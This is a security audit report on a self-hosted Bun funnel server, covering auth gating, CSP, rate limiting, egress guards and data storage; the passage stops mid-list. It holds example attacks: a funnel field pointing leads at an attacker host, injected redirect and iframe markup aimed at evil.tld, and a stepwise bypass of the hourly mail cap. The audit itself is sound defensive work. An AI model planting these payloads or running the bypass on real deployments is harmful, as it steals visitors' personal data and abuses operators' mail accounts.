# Track C — Server-side runtime security audit

**Target:** `apps/runtime/` (OpenFunnel Bun server), ~2,050 LOC of runtime + ~910 LOC of tests
**Method:** static read of every file in scope. No code from the repo was executed.
**Date:** 2026-08-09

---

## VERDICT

**Competent, security-first work — not security theatre.** This is unusually good for a
pre-1.0 self-hosted project. The privileged gate is *structural* (the router dispatches
privileged handlers **inside** the branch that runs the CSRF check and `requireAdmin`, so
there is no "forgot to add the check" failure mode), token comparison is constant-time,
the DNS-rebinding hole in loopback trust is genuinely closed by `Host`-header validation,
the egress guard resolves DNS and *pins* `http://` targets to the vetted address, the
funnel-page CSP is hash-pinned with no `'unsafe-inline'` in `script-src`, and the
"never log a fetch error object because Bun puts credentials on `err.path`" rule is
applied consistently across all seven outbound call sites. `SECURITY.md` is honest to the
point of self-incrimination and correctly identifies where a reviewer's time is best
spent. The code comments name the specific historical bug each defence prevents, and the
test suite enumerates the whole privileged surface rather than sampling it.

The residual problems are of three kinds, none of which is a remote-unauthenticated
compromise: (1) **availability** — the public ingest path has no ceiling on disk or memory
growth and the admin readers slurp the whole sink into RAM; (2) **a real logic bug in the
rate limiter** whose prune uses the *caller's* window instead of the *bucket's*, which can
reset the one mail ceiling the design calls load-bearing; (3) **the imported-funnel-document
threat is under-modelled in one specific place** — `integrations.leadEndpoint` lets a
funnel document redirect every captured lead to a third-party origin, and the CSP is
explicitly widened to permit it. Plus a documentation/implementation gap: the README tells
operators to bind the process to `127.0.0.1` and the code provides no way to do that.

No Critical findings. Four Major, nine Minor, seven Info.

---

## Route / auth table

`path` = `new URL(req.url).pathname` with trailing slashes stripped (`server.js:77`).
Gate order per request: `OPTIONS` short-circuit → `/healthz` → `handleAssets` →
`handleFunnels` → **privileged branch** → `handleOtp` → `handleIngest` → 404.

| Method | Path | Handler | Auth required | Notes |
|---|---|---|---|---|
| OPTIONS | any | `server.js:83` | none | 204. CORS headers only for `PUBLIC_CORS_PATHS`; privileged prefixes get a bare 204, so preflight fails. Correct. |
| GET | `/healthz` | `server.js:90` | **none** | Leaks `{supabase: bool}`. Info-level. |
| any | `/_of/*` | `static.js:71` | **none** | Serves `packages/engine/src` 1:1. Method-agnostic. |
| any | `/`, `/app`, `/builder`, `/admin`, `/leads`, `/analytics`, `/templates`, `/settings`, `/_app/*` | `static.js:47` | **none** | Console shell (apps/app). `X-Frame-Options: DENY` + `frame-ancestors 'none'`. |
| any | `/_builder/*` | `static.js:47` | **none** | Legacy UI. Explicitly out of scope in SECURITY.md. |
| any | `/_admin/*` | `static.js:47` | **none** | Legacy UI. Same. |
| any | `/f/:slug` | `funnels.js:25` | **none** | Funnel HTML + per-funnel CSP. `SLUG_RE` enforced in `loadFunnel`. |
| any | `/api/funnels` | `funnels.js:33` | **none** | Enumerates every funnel slug + name + theme. |
| any | `/api/funnels/:slug` | `funnels.js:50` | **none** | `publicFunnel()`-redacted document. |
| GET | `/api/builder/funnel/:slug` | `builder.js:35` | **admin + not-cross-site** | **Unredacted** doc incl. `webhookSecret`. |
| POST | `/api/builder/save` | `builder.js:41` | **admin + not-cross-site** | `SLUG_RE` + `isInside`. |
| POST | `/api/builder/delete` | `builder.js:57` | **admin + not-cross-site** | `SLUG_RE` + `isInside`. |
| POST | `/api/builder/duplicate` | `builder.js:70` | **admin + not-cross-site** | `SLUG_RE` + `isInside`. |
| GET | `/api/admin/leads` | `admin.js:31` | **admin + not-cross-site** | All lead PII, unpaginated. |
| GET | `/api/admin/stats` | `admin.js:36` | **admin + not-cross-site** | Reads both JSONL sinks fully. |
| GET | `/api/admin/email-settings` | `admin.js:40` | **admin + not-cross-site** | Redacted. |
| POST | `/api/admin/email-settings` | `admin.js:45` | **admin + not-cross-site** | Allowlisted keys only. |
| POST | `/api/admin/test-email` | `admin.js:56` | **admin + not-cross-site** | Sends mail to any address. 10/hr/IP. |
| POST | `/api/ai/generate` | `ai.js:25` | **admin + not-cross-site** | Accepts `apiKey` in body; falls back to `OPENAI_API_KEY`. |
| POST | `/api/ai/improve-copy` | `ai.js:51` | **admin + not-cross-site** | Same. |
| any | `/api/admin/*`, `/api/builder/*`, `/api/ai/*` (unmatched) | `server.js:118` | **admin + not-cross-site** | 404 *after* the gate — no path-shape oracle before auth. |
| POST | `/api/otp/send` | `otp.js:28` | **none** | Sends mail. 1/min + 5/hr per address, 20/hr per IP, global `MAIL_HOURLY_CAP`. |
| POST | `/api/otp/verify` | `otp.js:58` | **none** | 30 per 10min per IP; 5 attempts per code. |
| POST | `/api/lead` | `ingest.js:29` | **none** | 30/min per IP. CORS `*`. |
| POST | `/api/events` | `ingest.js:29` | **none** | 300/min per IP. CORS `*`. |

**Gate structure — verified.** `isPrivilegedPath` (`auth.js:39`) is a `startsWith` test over
`["/api/admin/", "/api/builder/", "/api/ai/"]`, and `server.js:106-120` dispatches the three
handler modules *inside* that `if`. I tried the usual escapes against the exact string the
gate and the handlers both read:

- `//api/admin/leads` → `isPrivilegedPath` false, and `handleAdmin`'s `path === "/api/admin/leads"` also false → 404. **Fails closed.**
- `/API/ADMIN/leads` → same, 404. **Fails closed.**
- `/api/admin%2fleads` → `%2f` survives WHATWG parsing → neither matches → 404. **Fails closed.**
- `/api/admin/./leads` and `/api/admin/leads/` → normalise/strip to the canonical path → gate applies. **Correct.**
- `handleAssets` / `handleFunnels` run *before* the gate but match disjoint prefixes (`/_of/`, `/_app/`, `/_builder/`, `/_admin/`, `/f/`, `/api/funnels`) — no overlap with `/api/admin/`.

The gate is genuinely structural. Adding a route to `admin.js`/`builder.js`/`ai.js`
inherits both checks automatically.

---

## Findings

### MAJOR

---

#### M1 — `integrations.leadEndpoint` in a funnel document redirects every captured lead to an arbitrary origin, and the CSP is widened to allow it

**Files:** `apps/runtime/lib/csp.js:242-250`, `apps/runtime/lib/funnels.js:89-90`,
`packages/engine/src/controller.js:189`
**Needs public exposure:** No — this fires on any deployment, local included.

```js
// lib/csp.js:242
  // A funnel may post leads to the operator's own backend instead of ours.
  const leadEndpoint = integrations.leadEndpoint;
  if (typeof leadEndpoint === "string" && /^https?:\/\//i.test(leadEndpoint)) {
    try {
      connect.add(new URL(leadEndpoint).origin);
```

```js
// lib/funnels.js:89
// `leadEndpoint` deliberately stays: it is a plain path the engine needs in
// order to know where to POST, and it carries no secret.
```

```js
// packages/engine/src/controller.js:189
      endpoint: this.funnel.integrations?.leadEndpoint || this.options.leadEndpoint,
```

**Why it's exploitable.** The stated threat model (`SECURITY.md:56`) treats an *imported
funnel document* as untrusted. `integrations.leadEndpoint` **overrides** the server-supplied
`/api/lead` (note the `||` precedence in `controller.js:189` — the document wins over the
boot script's option), it is deliberately **not** stripped by `publicFunnel()`, and
`funnelCsp()` explicitly adds its origin to `connect-src` so the browser will not block the
request. The three defences that would otherwise stop this each step aside for it.

**Attack scenario.** Attacker publishes a polished "Fitness Quiz" template on a gist /
template pack / Discord. It contains `"integrations": { "leadEndpoint": "https://leads.attacker.tld/c" }`
buried among the theme fields. The operator imports it (which the README actively encourages),
saves it, and runs ads. Every name, email and phone number goes to the attacker's server and
**never reaches the operator's own `/api/lead`** — so `leads.jsonl` is empty, the console shows
zero leads, and the operator's most likely diagnosis is "the funnel isn't converting". There is
no server-side log of the redirection because the server is never contacted.

**Why the docs don't cover it.** README:572-575 says the realistic damage from an imported
document is "injected markup (a phishing link, a third-party tracking pixel) rather than code
execution". Silent, total exfiltration of the operator's primary asset is a materially worse
outcome than a phishing link and is not mentioned anywhere.

**Fix shape.** Either (a) strip `leadEndpoint` in `publicFunnel()` and require it to come from
the environment like `WEBHOOK_URL` does, (b) restrict it to same-origin/relative paths, or
(c) surface an unmissable warning in the console when an imported document carries a
cross-origin `leadEndpoint`. The `webhookUrl` field already got treatment (a) for exactly this
reason — this is the same class of field that was missed.

---

#### M2 — The rate limiter's prune uses the *caller's* window, not the *bucket's* — it silently resets long-window limits, including the global mail ceiling

**File:** `apps/runtime/lib/ratelimit.js:24-41`
**Needs public exposure:** No (LAN or public both work).

```js
export function rateLimit(key, max, windowMs) {
  const now = Date.now();
  const hits = (rateBuckets.get(key) || []).filter((t) => now - t < windowMs);
  if (hits.length >= max) {
    rateBuckets.set(key, hits);
    return false;
  }
  hits.push(now);
  rateBuckets.set(key, hits);

  // Opportunistic prune so a long-running server cannot grow this unbounded.
  if (rateBuckets.size > 5000) {
    for (const [k, v] of rateBuckets) {
      if (!v.length || now - v[v.length - 1] > windowMs) rateBuckets.delete(k);
    }
  }
  return true;
}
```

**Why it's exploitable.** `rateBuckets` stores only timestamp arrays — the window each bucket
belongs to is **not** stored. The prune therefore evaluates every bucket against `windowMs`
*of the call that happened to trigger the prune*. The windows in use range from 60 s
(`ingest:`, `otp-send:`) to 3,600,000 ms (`otp-send-global`, `autoresponder-global`,
`notify-global`, `otp-send-hourly:`, `otp-send-ip:`, `autoresponder:`, `test-email:`). Any
prune triggered by a 60-second-window call deletes **every hourly bucket whose last hit is
more than 60 seconds old**, resetting its counter to zero.

The second half matters: when a bucket is at its ceiling, the early-return branch
(`if (hits.length >= max)`) does **not** push `now` — so an exhausted bucket's last timestamp
stops advancing, which is precisely the condition the prune deletes on. An exhausted hourly
ceiling becomes eligible for deletion 60 seconds after it saturates.

**Attack scenario (defeating `MAIL_HOURLY_CAP`).** `otp.js:13` and `ratelimit.js:45-56` both
identify the global cap as *the* load-bearing bound, because every other mail limit keys on
something the caller can rotate.
1. Inflate `rateBuckets` past 5000 entries. Every `/api/lead` with a distinct `lead.email`
   creates an `autoresponder:<email>` key (`email.js:394`) — that call happens **before** the
   global check, so keys keep accruing even after the global cap saturates. At 30 leads/min/IP
   that is 1,800 new keys/hour from one address; a handful of sources gets there in minutes.
   (`/api/otp/send` creates two keys per request via `otp-send:` + `otp-send-hourly:` before
   its per-IP cap applies, giving a second growth path.)
2. Saturate `autoresponder-global` / `otp-send-global` at `MAIL_HOURLY_CAP` (default 500).
3. Wait 60 s, then send one more `/api/lead`. Its first limiter call is
   `rateLimit("ingest:"+ip, 30, 60_000)` — `windowMs` = 60 s. With the map over 5000, the
   prune deletes `autoresponder-global` and `otp-send-global` (last hit > 60 s ago).
4. The next 500 messages go out. Repeat roughly once per minute.

Net effect: the advertised **500 mails/hour** ceiling degrades to roughly **500 per minute**
(~30,000/hr) of attacker-addressed mail leaving the operator's Resend/relay account — the
open-relay outcome the cap exists to prevent, plus the sender-reputation damage.

Even with no attacker, this bug silently widens every hourly limit on any busy server that
crosses 5,000 buckets.

**Fix shape.** Store the window with the bucket (`{ hits, windowMs }`) and prune against the
bucket's own window; or keep a monotonic `expiresAt` per bucket and prune on that.

---

#### M3 — Unauthenticated, unbounded disk and memory growth via `/api/events` and `/api/lead`

**Files:** `apps/runtime/routes/ingest.js:50`, `apps/runtime/lib/store.js:25-28`,
`apps/runtime/lib/store.js:57-65`, `apps/runtime/routes/admin.js:32,86-87`
**Needs public exposure:** Yes — public, or a hostile LAN.

```js
// routes/ingest.js:50
  if (!rateLimit(`ingest:${ip || "unknown"}`, path === "/api/lead" ? 30 : 300, 60 * 1000)) {
```

```js
// lib/store.js:25
async function appendJsonl(kind, record) {
  await mkdir(DATA_DIR, { recursive: true });
  await appendFile(join(DATA_DIR, `${kind}.jsonl`), `${JSON.stringify(record)}\n`, "utf8");
}
```

```js
// lib/store.js:57
export async function readJsonlRecords(filename) {
  try {
    const file = join(DATA_DIR, filename);
    const content = await readFile(file, "utf8");
    return content.trim().split("\n").filter(Boolean).map((line) => JSON.parse(line));
```

**Why it's exploitable.** The record written is `{ ...body, received_at, ip, user_agent,
referer }` (`ingest.js:54-60`) — the *entire* 64 KB request body is persisted verbatim; no
field allowlist, no per-record size cap, no total-file cap, no retention policy. `/api/events`
permits 300 requests/min per IP:

> 300 req/min × ~65 KB = **~19.5 MB/min ≈ 28 GB/day from a single IP address**, unauthenticated.

`/api/lead` adds ~2.8 GB/day/IP on top and additionally fans out to Supabase, the Meta CAPI
and the webhook per record (`store.js:74-81`), amplifying the traffic outbound.

The read side turns this into a memory kill: `readJsonlRecords` does `readFile` of the whole
file into one string, `split("\n")`, and `JSON.parse` per line. `/api/admin/leads` calls it
once; `/api/admin/stats` calls it **twice** (`admin.js:86-87`) and then builds `Set`s over
every session id. Once the sink is a few hundred MB the operator's own console request OOMs
the process. Note the ordering consequence: the attacker fills the disk, and the *operator*
is the one who triggers the crash by opening the lead inbox.

`rateLimit`'s per-IP key is the socket address unless `TRUST_PROXY=1`, so a single-IP attack
is capped as above; on a `TRUST_PROXY=1` deployment behind a proxy that *appends* rather than
replaces `x-forwarded-for` (the nginx `$proxy_add_x_forwarded_for` default — the code warns
about this at `http.js:143-147` but cannot enforce it), the key is caller-supplied and the
limit is removed entirely.

**Fix shape.** Cap the persisted record (allowlist fields, or truncate), cap total sink size
with rotation, and stream/tail-read + paginate the admin readers instead of loading the whole
file.

---

#### M4 — The server binds all interfaces and offers no way to change it, while the README instructs operators to bind `127.0.0.1`

**Files:** `apps/runtime/server.js:57-73`, `apps/runtime/lib/config.js:29`, `README.md:530`
**Needs public exposure:** This *is* the exposure bug.

```js
// server.js:57
const server = import.meta.main ? Bun.serve({
  port: PORT,
  ...
```

`Bun.serve` defaults `hostname` to `0.0.0.0`. `config.js` reads `PORT` and never a
`HOST`/`HOSTNAME`. Meanwhile:

> README.md:530 — "put nginx, Caddy or Cloudflare in front with a certificate … **and bind this
> process to `127.0.0.1`** so it is only reachable through the proxy."

There is no supported way to do that. The operator either edits `server.js` or uses a
firewall. Meanwhile the boot banner prints `http://localhost:3000`, which is exactly the
mismatch the author *already fixed* in `scripts/serve.mjs`:

```js
// scripts/serve.mjs:26
// Loopback by default. A static server pointed at a source tree is not something
// to put on a network without saying so out loud.
const HOST = process.env.DEMO_HOST || "127.0.0.1";
```

The lesson was applied to the demo server and not to the real one.

**Consequence on a laptop on a LAN (`bun run dev`, no `ADMIN_TOKEN`):** every peer on the
network can reach `/api/lead`, `/api/events`, `/api/otp/send` (mail from the operator's
domain), `/api/funnels` (enumerate every funnel), `/api/funnels/:slug`, `/f/:slug`, and the
console *shell* at `/`. They cannot read leads or write funnels — the loopback check
(`auth.js:62-81`) holds, verified below. So: no PII read, but lead-sink poisoning,
funnel-content disclosure, outbound-mail abuse, and M3's disk fill are all available to
anyone on the same Wi-Fi.

**Fix shape.** `hostname: process.env.HOST || (DEV ? "127.0.0.1" : "0.0.0.0")`, and make the
banner print what it actually bound.

---

### MINOR

---

#### m1 — `ALLOW_CUSTOM_SCRIPTS=1` hashes whatever the *document* carries, not what the operator pasted

**File:** `apps/runtime/lib/csp.js:103-121, 252-275`

```js
 *  `ALLOW_CUSTOM_SCRIPTS=1` opts in, and even then the policy is not widened to
 *  `'unsafe-inline'`: each inline script is allowed by the SHA-256 of its exact
 *  bytes … Only what the operator pasted runs
```

`collectCustomScriptSources` hashes every executable `<script>` found in
`funnel.customHead`/`customBody` and adds every external `src` **origin** to both
`script-src` and `connect-src`. The code has no way to distinguish "the operator typed this
into the console" from "this arrived inside an imported funnel JSON". With the flag on,
importing one document is same-origin script execution on the console's origin, where
`of.adminToken` lives in `localStorage` (`apps/app/app.js:409`) → full lead database +
funnel write access.

SECURITY.md:82-87 documents the *origin-trust* half of this honestly. It does not state the
sharper version: with the flag on, **import = takeover**, which is a different sentence from
"an allowed origin can serve arbitrary changing script". The `.env.example:116-131` text has
the same gap ("only what you pasted runs").

Ranked Minor rather than Major because it is off by default, the default is well argued, and
the failure mode is fail-closed when off (verified below).

---

#### m2 — Lead PII and plaintext mail credentials are written with default `0644` permissions

**Files:** `apps/runtime/lib/store.js:26-27`, `apps/runtime/lib/email.js:153-155`

No `chmod`, no `mode:` option, no umask handling anywhere in the repo (verified by grep).
Under a typical `umask 022`:

- `DATA_DIR/` → `0755`
- `DATA_DIR/leads.jsonl` → `0644` — every lead's name, email, phone, IP, answers
- `DATA_DIR/email_settings.json` → `0644` — contains `resendApiKey` / `smtpPass` **in
  plaintext** whenever the operator typed one into the console (`email.js:120-123` persists
  typed secrets; only env-sourced ones are stripped)

On any multi-user host, a shared VPS, or a container with a non-root sidecar, every local
account can read the lead database and the mail credentials. `.env.example:18` says "keep it
off any path your web server hands out directly" but says nothing about file mode.

**Fix:** `mkdir(DATA_DIR, { recursive: true, mode: 0o700 })` and `mode: 0o600` on the writes.

---

#### m3 — The OTP code is written to stdout on the default (no-transport) install

**File:** `apps/runtime/lib/email.js:221`

```js
  console.log(`[email] No transport configured — would send to ${to}: "${subject}"`);
```

`sendOtpCode` sets `subject: \`${code} is your email verification code\`` (`email.js:277`).
With no `RESEND_API_KEY` / `SMTP_RELAY_URL` — the default — every OTP request prints the
visitor's email address *and the live six-digit code* to the server log. This directly
contradicts the comment three lines above it:

```js
  // The code is never returned to the caller — not even in development.
```

It is not returned to the caller, but it is durably logged. Low impact (the code only sets
`email_verified` on a lead record, and no transport means no code reached anyone anyway), but
it is PII + a live credential in a log stream, and the invariant the file states is false.

---

#### m4 — Visitor email addresses land in logs on two paths

**Files:** `apps/runtime/routes/ingest.js:70`, `apps/runtime/lib/email.js:221,395`

```js
      console.warn(`[runtime] unverified lead claimed email_verified: ${oneLine(record.lead.email, 120)}`);
```

CRLF is correctly stripped by `oneLine` (no log injection), but the address itself is PII
under GDPR and is written unconditionally, to a stream the README treats as non-sensitive.
`email.js:395` (`autoresponder rate limit hit for <email>`) is the same shape. Hash or
partially redact.

---

#### m5 — Egress guard: unblocked IP ranges

**File:** `apps/runtime/lib/webhook.js:26-52`

Missing from `isBlockedIpv4`: `192.0.0.0/24` (contains **`192.0.0.192`, Oracle Cloud's legacy
metadata address**), `198.18.0.0/15`, `224.0.0.0/4` multicast, `240.0.0.0/4` reserved,
`255.255.255.255`, and the TEST-NET blocks.

Missing from `isBlockedIpv6`: IPv4-compatible `::7f00:1` (the WHATWG serialisation of
`::127.0.0.1` — note `::ffff:` is caught but the deprecated `::`-only form is not), `fec0::/10`
site-local, `ff00::/8` multicast, `64:ff9b::/96` NAT64, `2002::/16` 6to4.

Severity is genuinely Minor here, and the file's own reasoning is why: the destination is
operator-owned (env or admin-written funnel document), never taken from a public request body
— `forwardWebhook:187-196` and the test at `server.test.js:349-368` both enforce that. So this
is a misconfiguration/compromised-DNS depth issue, not a visitor-reachable SSRF. The
`192.0.0.192` case is the one worth closing on merit.

---

#### m6 — `/api/admin/test-email` is exempt from `MAIL_HOURLY_CAP`, contradicting the rule stated in `ratelimit.js`

**Files:** `apps/runtime/routes/admin.js:63`, `apps/runtime/lib/ratelimit.js:53-56`

```js
// routes/admin.js:63
    if (!rateLimit(`test-email:${clientIp(req, server) || "unknown"}`, 10, 60 * 60 * 1000)) return tooMany();
```

```js
// lib/ratelimit.js:53
 * Any new endpoint that mails a caller-supplied address needs this ceiling too,
 * not just a per-address limit — the caller picks the addresses.
```

`test-email` mails a caller-supplied address (`admin.js:58`) and is keyed **only** on
`clientIp`, which honours `x-forwarded-for` when `TRUST_PROXY=1`. A leaked admin token on such
a deployment gives unbounded outbound mail from the operator's domain — exactly the case
`MAIL_HOURLY_CAP` exists for. Admin-gated, so Minor; but the codebase wrote the rule and then
missed one of its own three call sites. (The other two, `otp.js:52` and `email.js:347,402`,
apply it correctly.)

---

#### m7 — `customHead` / `customBody` / `customCss` give an imported funnel document an open redirect, an arbitrary `https:` iframe, and CSS injection on the operator's origin

**Files:** `apps/runtime/lib/html.js:96-97,104`, `apps/runtime/lib/csp.js:277-288`

```js
    ${customCss ? `<style id="of-custom-css">${customCss}</style>` : ""}
    ${customHead ? customHead : ""}
```

Injected raw with no escaping (deliberate — that's the feature). Script is correctly blocked
by CSP when the flag is off (verified below), but the policy permits:

- `<meta http-equiv="refresh" content="0;url=https://evil.tld">` — no CSP directive covers
  meta refresh since `navigate-to` was dropped. **Open redirect on the operator's domain.**
- `<iframe src="https://evil.tld">` — `frame-src https:` (`csp.js:285`) allows it, and
  `frame-ancestors` is deliberately absent, so the funnel page can be framed *and* frame
  anything. Full-page phishing overlay on the operator's own origin.
- `customCss` can close its own `<style>` with `</style>` and inject further markup; a
  `<script>` smuggled this way is **not** hashed (`collectCustomScriptSources` only scans
  head+body) and therefore blocked — correct fail-closed behaviour, worth noting.

Also `html.js:62`:
```js
    .map(([k, v]) => `${k}:${String(v).replace(/[<>"]/g, "")}`)
```
`themeVars` strips `<>"` but not `;`, so a theme value can append arbitrary declarations to
the `<html style="…">` attribute. Contained (attribute context, no selector escape, `esc()`
applied afterwards) — the practical reach is a `url()` beacon via `img-src https:`.

---

#### m8 — `/api/otp/send` allows targeted mailbox harassment and OTP lockout of a third party

**File:** `apps/runtime/routes/otp.js:37-39`

```js
    if (!rateLimit(`otp-send:${email}`, 1, 60 * 1000)) return tooMany();
    if (!rateLimit(`otp-send-hourly:${email}`, 5, 60 * 60 * 1000)) return tooMany();
```

Anyone can mail a "Verification Code" to any address, five per hour, from the operator's
sending domain. Two consequences: (a) the operator's domain sends unsolicited mail to a
third party, which is a deliverability/reputation problem attributed to the operator; (b) the
5/hr per-address cap means an attacker can pre-burn a genuine visitor's budget and lock them
out of verification. The 429 also acts as an oracle for "a code was requested for this address
in the last minute". Low impact given OTP only sets a metadata flag.

---

#### m9 — Email verification is process-global and not bound to a session

**Files:** `apps/runtime/lib/email.js:239,312,319-328`, `apps/runtime/routes/ingest.js:65-72`

```js
const verifiedEmails = new Map();
…
    verifiedEmails.set(normalized, Date.now() + VERIFIED_TTL_MS);
```

`isEmailVerified(email)` is keyed on the address alone. Once *any* visitor completes a
challenge for `foo@bar.com`, **every** `/api/lead` submission naming that address — from any
IP, any session, for 30 minutes — is stamped `email_verified: true`. The server-side
re-derivation (`ingest.js:67`) is a genuine improvement over trusting the client, and it is
tested (`server.test.js:231`), but the resulting flag means "someone proved control of this
address recently", not "this submitter proved it". Data-integrity issue rather than an
authorisation bypass, because nothing is authorised by the flag.

---

### INFO

- **I1 — `publicFunnel()` redaction is a denylist** (`funnels.js:91-121`). Twelve named keys
  under `integrations` plus five at top level. Any new secret-bearing integration field
  (`metaCapiToken`, `twilioAuthToken`, …) ships to the browser via `/api/funnels/:slug` until
  someone remembers to add it. An allowlist of *public* fields would fail closed. This is the
  same structural weakness that let `leadEndpoint` (M1) through.
- **I2 — `server.js:132-135` logs the raw error object**, the one thing `lib/log.js` exists to
  prevent (`console.error("[runtime] unhandled:", err)`). All seven outbound `fetch` sites are
  individually try/caught with `errSummary`, so nothing should reach it, but it is the single
  exception to the file's own stated rule. Same for `email.js:189` (`error: String(err)`) and
  `email.js:185` (`console.warn("[email] Resend error:", res.status, errText)` — a third-party
  response body straight into the log, unfiltered for CRLF).
- **I3 — `decodeURIComponent` in `static.js:48,72` can throw `URIError`** on a malformed escape
  (`/_of/%zz`). Neither function nor `handleAssets` catches it, so it unwinds to Bun's `error()`
  handler → a 500 instead of a 404. Not a crash, not a disclosure — cosmetic robustness.
- **I4 — `handleAssets` and `handleFunnels` ignore `req.method`.** `DELETE /_of/index.js` and
  `POST /f/lead-gen` both succeed as reads. No impact; noted for completeness.
- **I5 — JSONL append concurrency.** `appendFile` opens with `O_APPEND`, so the offset+write is
  kernel-atomic for a single `write(2)`; records here are ≤64 KB, comfortably within a single
  write on Linux/macOS. Interleaving is very unlikely but not formally guaranteed for large
  records. A corrupted line makes `readJsonlRecords` (`store.js:57`) throw and return `[]`,
  which blanks the operator's *entire* lead inbox rather than skipping the bad line —
  consider a per-line try/catch.
- **I6 — `scripts/serve.mjs` serves `examples/`**, which is also the default `FUNNELS_DIR`
  (`config.js:30`) that the console writes into. Running `bun run demo` therefore exposes
  **unredacted** funnel documents — including `integrations.webhookSecret` and `webhookUrl` —
  over HTTP. Loopback-only by default (`serve.mjs:28`) so impact is minimal, but `DEMO_HOST=0.0.0.0`
  turns it into a secret disclosure. The dotfile filter (`serve.mjs:61`) and the `SERVABLE`
  allowlist correctly keep `.env`, `.data/` and `.git/` out.
- **I7 — `/healthz` discloses whether Supabase is configured** (`server.js:90`). Trivial
  fingerprinting.
- **I8 — `SUPABASE_URL` and `SMTP_RELAY_URL` bypass the egress guard** (`store.js:40`,
  `email.js:197`). Both are env-only and operator-owned, and `relayUrl` is explicitly excluded
  from the settings API for exactly this reason (`email.js:76-79`, tested at
  `server.test.js:294`). Correct as designed; noted only so the exception is explicit.

---

## Verified correct

These are defences I actively tried to break and could not. Listing them because in an audit
they carry as much signal as the findings.

1. **The privileged gate is structural, not per-route.** `server.js:106-120` runs
   `isCrossSiteRequest` then `requireAdmin` and dispatches the three privileged modules
   *inside* that branch. I tested `//api/admin/`, case variation, `%2f` encoding, dot
   segments, and trailing slashes against the exact string both the gate and the handlers
   read — every variant either matches both or matches neither. A new handler added to
   `admin.js`/`builder.js`/`ai.js` cannot be reached ungated. `server.test.js:393-433`
   enumerates all 11 endpoints against both the proxied and cross-site cases.

2. **Token comparison is constant-time.** `auth.js:20-25` uses `node:crypto.timingSafeEqual`
   with an explicit length pre-check. The length check leaks the token's byte length, which is
   the standard and accepted trade (`timingSafeEqual` throws on unequal lengths); for a
   `openssl rand -hex 32` token this leaks nothing useful. **No timing attack is feasible.**

3. **Setting `ADMIN_TOKEN` strictly tightens.** `requireAdmin:94-101` returns 401 on a bad
   token and **never** falls through to the loopback path. There is no "token OR localhost"
   weakening.

4. **DNS rebinding into the console is genuinely closed.** `isLoopbackRequest:62-81` requires
   (a) no `x-forwarded-for`/`forwarded` header, (b) a loopback socket peer, **and** (c) a
   `Host` header matching `^(localhost|127\.0\.0\.1|\[::1\]|::1)(:\d+)?$` or `ALLOWED_HOSTS`.
   I worked the attack through: a page on `http://evil.tld:3000` whose A record flips to
   127.0.0.1 satisfies the socket check *and* is same-origin with itself so `Sec-Fetch-Site`
   reads `same-origin` — but the browser writes `Host: evil.tld:3000`, which fails. Reaching
   the console via `Host: localhost` requires the attacker page to *be* on
   `http://localhost:3000`, which makes it cross-site. Variants `127.0.0.1.nip.io`,
   `0.0.0.0:3000`, `localhost.` all fail the `Host` test. The `ALLOWED_HOSTS` port-stripping
   at line 80 is a correct usability fix that does not widen the check.

5. **CSRF on privileged routes is correctly handled, and correctly ordered.** `isCrossSiteRequest`
   (`http.js:91-109`) runs **before** `requireAdmin` (`server.js:109`) — necessary, because on a
   loopback-trust deploy the browser-driven caller is already "authorised". `Sec-Fetch-Site` is
   authoritative when present and page script cannot forge it; only `same-origin` and `none` pass
   (`same-site` is correctly rejected). The `Origin` fallback compares **host**, not origin,
   with the documented and correct reason (TLS-terminating proxies). An unparseable `Origin`
   returns `true` (deny) — fail-closed. Auth is **header-based, never cookie-based**
   (`app.js:409-414`), so CSRF cannot ride ambient credentials even if the check were bypassed.

6. **CORS is scoped, and the preflight surface is right.** `PUBLIC_CORS_PATHS`
   (`http.js:70`) is exactly the four public ingest paths. `server.js:83-87` answers `OPTIONS`
   on any other path with a **bare 204 and no CORS headers**, so a preflight for
   `/api/builder/save` fails at the browser. The `X-Admin-Token` header is non-simple and
   therefore always preflight-triggering. Correct.

7. **Path traversal is closed on every file-touching route.** `isInside` (`config.js:84-87`)
   requires the separator (`target === base || target.startsWith(base + sep)`) rather than a
   bare `startsWith`, which correctly rejects the `apps/app` → `apps/app-legacy` sibling class.
   I walked the encodings: WHATWG resolves literal and `%2e%2e` dot segments before routing;
   `%2f` survives to a *single* `decodeURIComponent` and is then caught by `normalize` +
   `isInside`; double-encoding (`%252e%252e%252f`) decodes once to a literal filename, not a
   traversal. `SLUG_RE` (`^[a-z0-9][a-z0-9-]{0,63}$/i`) is applied in `loadFunnel` *and*
   redundantly at every builder write path with an `isInside` re-check. **`DATA_DIR`, `.env`
   and `.git/` are not reachable through the runtime** — they lie outside all four served roots
   (`ENGINE_SRC`, `APP_DIR`, `BUILDER_DIR`, `ADMIN_DIR`). Case-insensitive macOS variants fail
   closed (the prefix routing is case-sensitive, so `/_APP/` simply 404s). Null bytes are
   rejected by Node/Bun's own path handling, not silently truncated.

8. **The funnel-page CSP is genuinely restrictive.** `default-src 'none'`, `base-uri 'none'`,
   `form-action 'self'`, and `script-src 'self' 'sha256-<boot>'` with **no `'unsafe-inline'`,
   no `'unsafe-eval'`, no wildcard**. The boot script is interpolation-free by construction
   (`csp.js:29-72`) so the hash is stable across funnels, and `server.test.js:521-531`
   recomputes the digest **from the bytes actually served** — the right way to test this.
   `style-src 'unsafe-inline'` is a documented and defensible exception (theme writes inline
   style attributes; style injection is a different risk class). `customCode()` being the
   single resolver read by both `funnelPage()` and `funnelCsp()` correctly eliminates the
   hash-drift hazard. The default (`ALLOW_CUSTOM_SCRIPTS` unset) refuses all pasted script and
   logs a server-side warning rather than failing silently in the visitor's browser — and
   `server.test.js:607-627` asserts exactly one `sha256-` in the policy, which is the assertion
   that would catch an inversion.

9. **The script-tag regex fails closed.** I probed `collectCustomScriptSources` for an
   HTML-parser differential — e.g. `<script foo="type=x" type="text/javascript">`, where
   `ATTR_RE("type")` matches inside the decoy value and yields a non-executable type. The
   result is that the script gets **no hash**, so the browser refuses it. Every mis-parse I
   could construct produces "does not run", never "runs unhashed". The non-greedy body
   (`csp.js:140`) correctly mirrors how the HTML parser terminates a script element.

10. **The egress guard's core is sound.** `isSafeWebhookTarget` correctly relies on WHATWG
    normalisation for `2130706433`, `0x7f000001`, `0177.0.0.1`, `0`, `127.1` and
    `[::ffff:127.0.0.1]` → `[::ffff:7f00:1]`; `url.hostname` returns IPv6 *with* brackets so
    the `startsWith("[")` dispatch is right; `http://user@127.0.0.1/` and
    `http://evil.com@127.0.0.1/` both resolve `hostname` to the real host. The scheme check
    rejects `file:`, `gopher:`, `javascript:`, `data:`. `resolveSafeTarget` resolves with
    `{ all: true }` and rejects if **any** answer is blocked (not just the first), treats a
